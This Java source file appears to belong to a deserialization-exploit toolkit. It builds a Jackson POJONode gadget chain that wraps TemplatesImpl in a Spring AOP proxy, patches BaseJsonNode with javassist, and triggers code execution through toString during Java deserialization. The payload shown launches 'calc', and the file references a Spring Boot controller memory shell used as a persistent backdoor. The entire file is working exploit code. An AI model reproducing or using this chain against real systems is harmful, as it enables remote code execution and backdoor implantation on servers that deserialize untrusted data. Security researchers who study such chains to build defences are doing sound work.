package gadget;

import com.fasterxml.jackson.databind.introspect.POJOPropertiesCollector;
import com.sun.org.apache.xpath.internal.objects.XString;
import gadget.memshell.SpringBootMemoryShellOfController;
import javassist.*;
import com.fasterxml.jackson.databind.node.POJONode;
import org.springframework.aop.framework.AdvisedSupport;
import util.GadgetUtils;
import util.SerializerUtils;
import util.TriggertoStringUtils;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;

import static util.GadgetUtils.makeMap;

//BadAttributeValueExpException.toString -> POJONode -> getter -> TemplatesImpl
public class Jackson {
    public static void main(String[] args) throws Exception {

//        final Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);

//        final Object template = GadgetUtils.templatesImplLocalWindows();
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        // 将修改后的CtClass加载至当前线程的上下文类加载器中
        ctClass.toClass();

        POJONode node = new POJONode(makeTemplatesImplAopProxy());
//        POJONode node = new POJONode(template);


        Object o = TriggertoStringUtils.eventListenerList(node);
//        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
//        Field valfield = val.getClass().getDeclaredField("val");
//        valfield.setAccessible(true);
//        valfield.set(val, node);
//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
//        oos.writeObject(val);\
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
        oos.writeObject(o);


        SerializerUtils.unserialize(byteArrayOutputStream.toByteArray());
//        System.out.println(Base64.getEncoder().encodeToString(SerializerUtils.serialize(val)));
    }

    public static Object makeTemplatesImplAopProxy() throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);
        template = GadgetUtils.createTemplatesImpl("calc");
        advisedSupport.setTarget(template);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }
}
